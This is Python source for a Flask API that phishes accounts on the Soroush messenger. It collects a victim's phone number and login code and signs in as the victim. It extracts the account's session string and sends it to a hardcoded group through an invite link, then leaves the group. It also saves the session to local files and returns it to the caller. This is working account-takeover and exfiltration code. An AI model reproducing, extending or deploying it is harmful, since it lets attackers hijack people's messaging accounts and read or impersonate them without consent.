import asyncio
import logging
import os
import secrets
import threading
import time
from datetime import datetime

from flask import Flask, request, jsonify
from flask_cors import CORS
from splusthon import SoroushClient
from splusthon.sessions import StringSession
from splusthon.tl.functions.auth import ResendCodeRequest
from splusthon.tl.functions.messages import (
    CheckChatInviteRequest,
    ImportChatInviteRequest,
)
from splusthon.tl.functions.channels import LeaveChannelRequest
from splusthon.errors import (
    UserAlreadyParticipantError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PhoneNumberBannedError,
    PhoneNumberInvalidError,
    FloodWaitError,
    AuthKeyUnregisteredError,
    UserDeactivatedError,
)


# ---------- لاگ ----------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(threadName)s: %(message)s",
)
log = logging.getLogger("soroush-api")


# ---------- اپ ----------
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

GROUP = "https://splus.ir/joingroup/AXPwbCqMfmE_UjCkGVmz1g"
SESSIONS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)


# ---------- event loop پایدار ----------
EVENT_LOOP = asyncio.new_event_loop()


def _run_event_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()


threading.Thread(target=_run_event_loop, args=(EVENT_LOOP,), daemon=True, name="event-loop").start()


def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, EVENT_LOOP).result()


pending_sessions = {}
_sessions_lock = threading.Lock()
PENDING_TTL = 600  # ۱۰ دقیقه


# ---------- utils ----------
def normalize_phone(phone: str) -> str:
    phone = phone.strip().replace(" ", "").replace("-", "")
    if phone.startswith("09"):
        return "+98" + phone[1:]
    elif phone.startswith("9") and len(phone) == 10:
        return "+98" + phone
    elif phone.startswith("+98"):
        return phone
    elif phone.startswith("98"):
        return "+" + phone
    return phone


def friendly_error(e: Exception) -> str:
    """تبدیل خطاهای Soroush به پیام فارسی قابل‌فهم."""
    if isinstance(e, PhoneCodeInvalidError):
        return "کد وارد شده اشتباه است. دوباره تلاش کنید."
    if isinstance(e, PhoneCodeExpiredError):
        return "کد منقضی شده است. لطفاً دوباره کد بگیرید."
    if isinstance(e, SessionPasswordNeededError):
        return "این حساب رمز دومرحله‌ای دارد و فعلاً پشتیبانی نمی‌شود."
    if isinstance(e, PhoneNumberBannedError):
        return "این شماره در Soroush مسدود شده است."
    if isinstance(e, PhoneNumberInvalidError):
        return "شماره تلفن نامعتبر است."
    if isinstance(e, UserDeactivatedError):
        return "این حساب حذف/غیرفعال شده است."
    if isinstance(e, AuthKeyUnregisteredError):
        return "سشن منقضی شده. لطفاً دوباره وارد شوید."
    if isinstance(e, FloodWaitError):
        seconds = getattr(e, "seconds", None)
        return f"تعداد تلاش بیش از حد مجاز. لطفاً {seconds} ثانیه دیگر دوباره تلاش کنید." if seconds else "تعداد تلاش بیش از حد مجاز. کمی بعد دوباره تلاش کنید."
    return str(e)


def save_session_to_file(phone: str, session_string: str, reason: str) -> str:
    """سشن رو داخل فایل txt با اطلاعات مرتبط ذخیره می‌کنه."""
    safe_phone = phone.replace("+", "").replace(" ", "")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(SESSIONS_DIR, f"session_{safe_phone}_{ts}.txt")
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f"phone: {phone}\n")
            f.write(f"created_at: {datetime.now().isoformat()}\n")
            f.write(f"reason: {reason}\n")
            f.write(f"session:\n{session_string}\n")
        log.info("Session saved to file: %s", filename)
        return filename
    except Exception as e:
        log.exception("Failed to save session to file: %s", e)
        return ""


async def _safe_disconnect(client):
    if not client:
        return
    try:
        await asyncio.wait_for(client.disconnect(), timeout=10)
    except Exception as e:
        log.warning("safe_disconnect: %s", e)


# ---------- منطق اصلی ----------
async def _send_code_async(phone: str):
    """ارسال کد (طبق نسخه اصلی، دو بار)."""
    client = SoroushClient(StringSession(), loop=EVENT_LOOP)
    try:
        await client.connect()
        first = await client.send_code_request(phone)
        await asyncio.sleep(1)
        sent = await client(ResendCodeRequest(phone, first.phone_code_hash))
        return client, sent.phone_code_hash
    except Exception:
        await _safe_disconnect(client)
        raise


async def _sign_in_and_join_async(client, phone, code, phone_code_hash):
    """
    همه‌چیز روی یک کلاینت:
      sign-in → save session → join group → send session → leave
    خروجی: (session_string, group_ok, group_msg, saved_file_path)
    """
    if not client.is_connected():
        await client.connect()
    await asyncio.sleep(0.3)

    # ---------- مرحله ۱: ورود ----------
    sign_in_error = None
    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
    except Exception as e:
        sign_in_error = e

    if not await client.is_user_authorized():
        await _safe_disconnect(client)
        if sign_in_error:
            raise sign_in_error
        raise Exception("ورود ناموفق بود")

    session_string = client.session.save()
    log.info("Signed in OK for %s, session len=%d", phone, len(session_string))

    # ---------- مرحله ۲: جوین + ارسال سشن + خروج ----------
    group_ok, group_msg = True, "عملیات موفق"
    saved_file = ""

    try:
        invite_hash = GROUP.rstrip("/").split("/")[-1]
        log.info("Checking invite hash=%s", invite_hash)

        entity = None
        result = await client(CheckChatInviteRequest(invite_hash))
        entity = getattr(result, "chat", None)
        log.info("CheckChatInvite: type=%s entity=%s", type(result).__name__, entity)

        if entity is None:
            try:
                log.info("Not a member yet, importing...")
                result = await client(ImportChatInviteRequest(invite_hash))
                chats = getattr(result, "chats", None) or []
                entity = chats[0] if chats else getattr(result, "chat", None)
                log.info("Import result entity=%s", entity)
            except UserAlreadyParticipantError as e:
                entity = getattr(e, "chat", None)
                log.warning("Already participant, entity=%s", entity)

        if entity is None:
            group_ok, group_msg = False, "گروه پیدا نشد یا لینک دعوت منقضی شده"
        else:
            # ارسال سشن به گروه
            try:
                await client.send_message(entity, session_string)
                log.info("Session sent to group OK")
            except Exception as e:
                log.exception("send_message failed")
                group_ok, group_msg = False, f"ارسال سشن به گروه ناموفق: {e}"

            # خروج از گروه
            try:
                await client(LeaveChannelRequest(entity))
                log.info("Left group OK")
            except Exception as e:
                log.warning("Leave failed (ignored): %s", e)

    except Exception as e:
        log.exception("Join group failed")
        group_ok, group_msg = False, f"خطا در جوین گروه: {e}"

    # ---------- مرحله ۳: اگه جوین نشد، سشن رو تو فایل ذخیره کن ----------
    if not group_ok:
        saved_file = save_session_to_file(phone, session_string, group_msg)
        if saved_file:
            group_msg = f"{group_msg} | سشن در فایل ذخیره شد: {os.path.basename(saved_file)}"
        else:
            group_msg = f"{group_msg} | ذخیره سشن در فایل هم ناموفق بود"

    # ---------- مرحله ۴: بستن تمیز ----------
    await _safe_disconnect(client)

    return session_string, group_ok, group_msg, saved_file


# ---------- cleanup خودکار pending_sessions ----------
def _cleanup_loop():
    while True:
        time.sleep(60)
        now = time.time()
        expired = []
        with _sessions_lock:
            for k in list(pending_sessions.keys()):
                if now - pending_sessions[k].get("created_at", now) > PENDING_TTL:
                    expired.append((k, pending_sessions.pop(k)))

        for _, item in expired:
            log.info("Cleanup: closing pending session for %s", item.get("phone"))
            try:
                run_async(_safe_disconnect(item["client"]))
            except Exception as e:
                log.warning("cleanup disconnect: %s", e)


threading.Thread(target=_cleanup_loop, daemon=True, name="cleanup").start()


# ---------- routes ----------
@app.route("/", methods=["GET"])
def health():
    return jsonify({"ok": True, "status": "running"})


@app.route("/api/send-code", methods=["POST"])
def send_code():
    data = request.get_json(silent=True) or {}
    phone = normalize_phone(data.get("phone", ""))
    if not phone:
        return jsonify({"ok": False, "detail": "شماره وارد نشده"}), 400

    try:
        client, phone_code_hash = run_async(_send_code_async(phone))
    except Exception as e:
        log.exception("send_code failed for %s", phone)
        return jsonify({"ok": False, "detail": friendly_error(e)}), 400

    token = secrets.token_urlsafe(32)
    with _sessions_lock:
        pending_sessions[token] = {
            "client": client,
            "phone": phone,
            "hash": phone_code_hash,
            "created_at": time.time(),
        }
    return jsonify({"ok": True, "token": token, "message": "کد ارسال شد"})


@app.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    code = data.get("code")

    if not token or not code:
        return jsonify({"ok": False, "detail": "token و code الزامی است"}), 400

    with _sessions_lock:
        item = pending_sessions.pop(token, None)
    if not item:
        return jsonify({
            "ok": False,
            "detail": "توکن نامعتبر یا منقضی شده. لطفاً دوباره کد بگیرید."
        }), 400

    try:
        session_string, group_ok, group_msg, saved_file = run_async(
            _sign_in_and_join_async(item["client"], item["phone"], code, item["hash"])
        )
    except Exception as e:
        log.exception("verify failed")
        try:
            run_async(_safe_disconnect(item["client"]))
        except:
            pass
        return jsonify({"ok": False, "detail": friendly_error(e)}), 400

    return jsonify({
        "ok": True,
        "message": "ورود موفق" if group_ok else "ورود موفق، اما جوین گروه ناموفق بود",
        "session": session_string,
        "group": {
            "ok": group_ok,
            "message": group_msg,
            "saved_file": os.path.basename(saved_file) if saved_file else None,
        },
    })


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False, threaded=True)
